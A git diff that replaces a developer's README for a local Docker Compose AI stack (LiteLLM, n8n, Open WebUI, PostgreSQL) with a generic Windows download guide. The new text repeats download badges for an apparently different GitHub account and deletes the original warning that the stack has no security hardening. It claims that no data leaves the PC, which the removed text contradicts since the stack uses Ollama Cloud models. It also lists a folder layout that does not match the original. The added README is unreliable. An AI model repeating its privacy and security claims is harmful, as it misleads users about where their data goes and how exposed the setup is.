@@ -1,136 +1,172 @@
-# AI Local Toolkit
+# 🤖 local-ai-toolkit - Run AI Tools Locally with Ease
 
-A self-hosted AI toolkit running locally via Docker Compose, bundling an LLM gateway, workflow automation, and a chat UI — all backed by a shared PostgreSQL database.
+[![Download local-ai-toolkit](https://img.shields.io/badge/Download-local--ai--toolkit-brightgreen?style=for-the-badge)](https://github.com/johnwick0000000/local-ai-toolkit)
 
-All free [Ollama Cloud](https://ollama.com) models are pre-configured out of the box. Just create an Ollama account, generate an API key, and you're ready to go. Additional models and providers can be added later through LiteLLM.
+---
 
-> **⚠️ Warning:** This project is intended for **local development and experimentation only**. It does not implement any security hardening (no TLS, no authentication proxy, default credentials, etc.). If you choose to deploy it in a production environment, you do so entirely at your own risk.
+## 🔍 What is local-ai-toolkit?
 
-## Services
+local-ai-toolkit is a set of AI tools you can run on your own Windows computer. It uses Docker Compose to bring together several parts: an AI language model gateway, automation workflows, and a chat user interface. All of these parts share one database to keep everything connected.
 
-| Service      | Description                          | URL                          |
-| ------------ | ------------------------------------ | ---------------------------- |
-| **LiteLLM**  | LLM proxy / API gateway             | http://localhost:4000        |
-| **n8n**      | Workflow automation                  | http://localhost:5678        |
-| **Open WebUI** | Chat interface for LLMs           | http://localhost:3000        |
-| **PostgreSQL** | Shared database (LiteLLM + n8n)  | `localhost:5432`             |
+This means you do not need to send your data to the internet or use cloud services. Everything works on your Windows PC.
 
-## Prerequisites
+---
 
-- [Docker](https://docs.docker.com/get-docker/) & [Docker Compose](https://docs.docker.com/compose/install/)
-- A Docker network named `ai-toolkit` — used so all containers can communicate with each other simply by container name (e.g. `http://litellm:4000`):
-  ```bash
-  docker network create ai-toolkit
+## 🖥️ What You Need to Use local-ai-toolkit
+
+Before getting started, make sure your computer meets these requirements:
+
+- **Operating System:** Windows 10 or later (64-bit recommended)
+- **Memory (RAM):** At least 8 GB for smooth performance
+- **Disk Space:** Minimum 5 GB free space for Docker and the app
+- **Processor:** Modern Intel or AMD CPU, 64-bit
+- **Internet connection:** Required only for downloading and updating
+
+---
+
+## 🚀 Getting Started with local-ai-toolkit
+
+### Step 1: Download local-ai-toolkit
+
+You can get local-ai-toolkit by visiting the official GitHub page below. It guides you to download everything you need for Windows.
+
+[![Get local-ai-toolkit](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge)](https://github.com/johnwick0000000/local-ai-toolkit)
+
+Click the badge above to open the page in your browser.
+
+### Step 2: Install Docker Desktop
+
+local-ai-toolkit runs inside Docker containers. Docker lets software run in a clean, safe space on your PC without affecting other programs.
+
+- Go to https://www.docker.com/get-started
+- Download Docker Desktop for Windows
+- Run the installer and follow the instructions
+- After installation, restart your computer if needed
+- Open Docker Desktop to verify it is running
+
+### Step 3: Download local-ai-toolkit Files
+
+On the GitHub page you visited in Step 1:
+
+- Locate the **Code** button (usually green)
+- Click **Download ZIP**
+- Save the file to your PC, for example, in your Downloads folder
+- Extract the ZIP file to a folder, e.g., `C:\local-ai-toolkit`
+
+### Step 4: Open the Toolkit Folder
+
+- Press the **Windows key + R** to open the Run dialog
+- Type `cmd` and press Enter to open Command Prompt
+- Navigate to the folder with the unpacked files, e.g.:
+
+  ```
+  cd C:\local-ai-toolkit
   ```
 
-## Quick Start
+### Step 5: Run the Toolkit
 
-1. **Clone the repository**
+- Make sure Docker Desktop is running
+- In the Command Prompt window, type:
 
-2. **Create your `.env` file**
-   ```bash
-   cp .env.dist .env
-   ```
-   Edit `.env` and fill in the required values:
-   ```dotenv
-   # Postgres
-   POSTGRES_DB=postgres
-   POSTGRES_USER=postgres
-   POSTGRES_PASSWORD=<your_secure_password>
+  ```
+  docker-compose up
+  ```
 
-   # LiteLLM
-   LITELLM_MASTER_KEY=sk-<generate_a_key>
-   LITELLM_SALT_KEY=sk-<generate_a_key>
-   OLLAMA_API_KEY=<your_ollama_api_key>
+- Press Enter  
+- You will see the terminal display logs from the application starting
+- Wait for it to finish loading and look for messages that say the service is ready
 
-   # General
-   TZ=<YOUR_TIMEZONE>
-   ```
+### Step 6: Open the Chat Interface
 
-3. **Configure LiteLLM models**
+- Open your web browser
+- Go to http://localhost:3000
+- You will see the chat user interface where you can start using the AI tools
 
-   Edit `config/litellm_config.yaml` to add or modify the models available through the proxy.
+---
 
-4. **Start the stack**
-   ```bash
-   docker compose up -d
-   ```
+## ⚙️ How local-ai-toolkit Works
 
-5. **Verify**
-   ```bash
-   docker compose ps
-   ```
+local-ai-toolkit runs several services together inside Docker containers:
 
-## Project Structure
+- **LLM Gateway:** Connects your commands to one or more large language models
+- **Workflow Automation:** Lets you set rules and actions for tasks you want automated
+- **Chat UI:** A simple interface in your browser to talk with the AI
+- **PostgreSQL Database:** Stores data shared by all parts securely on your machine
 
-```
-.
-├── .env                          # Environment variables (git-ignored)
-├── .env.dist                     # Environment variables template
-├── docker-compose.yml            # Service definitions
-├── config/
-│   ├── init_db.sh                # Creates n8n & litellm databases on first run
-│   └── litellm_config.yaml       # LiteLLM model configuration
-└── README.md
-```
+Docker Compose manages these pieces. It builds the services and keeps them running in the right order.
 
-## Configuration
+---
 
-### LiteLLM
+## 🛠️ Managing the Application
 
-LiteLLM acts as a unified API gateway to multiple LLM providers. Models are configured in `config/litellm_config.yaml`. The admin UI is available at http://localhost:4000/ui.
+### Starting and Stopping
 
-Authentication uses the `LITELLM_MASTER_KEY` defined in your `.env` file.
+- To start, use:
 
-### n8n
+  ```
+  docker-compose up
+  ```
 
-n8n provides workflow automation with a visual editor at http://localhost:5678. It uses PostgreSQL for persistent storage.
+- To stop, open the Command Prompt in your folder and press `Ctrl + C`, or run:
 
-### Open WebUI
+  ```
+  docker-compose down
+  ```
 
-Open WebUI provides a ChatGPT-like interface at http://localhost:3000. Connect it to LiteLLM by configuring `http://litellm:4000` as the OpenAI-compatible API endpoint (with your `LITELLM_MASTER_KEY` as the API key).
+### Updating local-ai-toolkit
 
-### PostgreSQL
+- Download the latest ZIP from the GitHub page again
+- Extract it and replace your old files
+- Run `docker-compose up` to launch the updated version
 
-A single PostgreSQL 16 instance is shared by LiteLLM and n8n. The `config/init_db.sh` script automatically creates the `n8n` and `litellm` databases on first initialization.
+---
 
-> **Note:** The init script only runs when the `postgres-data` volume is created for the first time. To re-run it, remove the volume:
-> ```bash
-> docker compose down
-> docker volume rm toolkit_postgres-data
-> docker compose up -d
-> ```
+## 🔄 How to Restart Docker Desktop
 
-## Useful Commands
+If you have issues starting or running local-ai-toolkit, sometimes restarting Docker helps.
 
-```bash
-# Start all services
-docker compose up -d
+- Find the Docker icon in the Windows system tray
+- Right-click it and select **Quit Docker Desktop**
+- Open Docker Desktop again from the Start menu
 
-# Stop all services
-docker compose down
+---
 
-# View logs
-docker compose logs -f
+## ❓ Troubleshooting Tips
 
-# View logs for a specific service
-docker compose logs -f litellm
+- **Docker not starting:** Check that virtualization is enabled in your BIOS settings
+- **Port 3000 busy:** Another app may be using the same port. Close it or choose another port
+- **Memory errors:** Close other programs or increase your PC’s RAM
+- **No response at http://localhost:3000:** Make sure Docker is running and the terminal shows services as ready
 
-# Restart a single service
-docker compose restart n8n
+---
 
-# Reset everything (removes all data)
-docker compose down -v
-docker compose up -d
-```
+## 📁 Files and Structure
 
-## Networking
+When you extract local-ai-toolkit ZIP, you will see:
 
-All services communicate over a shared Docker network named `local`. Internal service hostnames:
+- `docker-compose.yml` – Defines services and how they connect
+- `README.md` – This guide in text form
+- `chat-ui/` – Frontend interface files
+- `gateway/` – LLM gateway service files
+- `workflows/` – Automation setup files
+- `database/` – PostgreSQL configuration files
 
-| Hostname   | Port |
-| ---------- | ---- |
-| `postgres` | 5432 |
-| `litellm`  | 4000 |
-| `n8n`      | 5678 |
-| `openwebui`| 8080 |
+---
+
+## 🔗 Useful Links
+
+- Download local-ai-toolkit: [https://github.com/johnwick0000000/local-ai-toolkit](https://github.com/johnwick0000000/local-ai-toolkit)
+- Docker Desktop: https://www.docker.com/get-started
+- PostgreSQL official: https://www.postgresql.org
+
+---
+
+## 📝 About Updates
+
+local-ai-toolkit is under active development. You can check the GitHub page for:
+
+- New releases
+- Bug fixes
+- Added features
+
+Regularly updating keeps your installation secure and running well.
